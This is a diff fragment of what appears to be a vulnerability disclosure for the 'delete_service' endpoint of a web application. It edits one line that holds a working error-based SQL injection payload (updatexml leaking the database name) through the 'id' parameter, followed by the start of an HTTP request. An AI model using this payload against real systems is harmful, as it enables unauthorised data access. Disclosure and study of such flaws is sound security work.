@@ -12,7 +12,7 @@ Vulnerability File: /msms/classes/Master.php?f=delete_service
 
 Vulnerability location: /msms/classes/Master.php?f=delete_service, id
 
-[+] Payload: id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),1)# // Leak place ---> id
+[+] Payload: id=3' and updatexml(1,concat(0x7e,database(),0x7e),1)# // Leak place ---> id
 
 ```sql
 POST /msms/classes/Master.php?f=delete_service HTTP/1.1
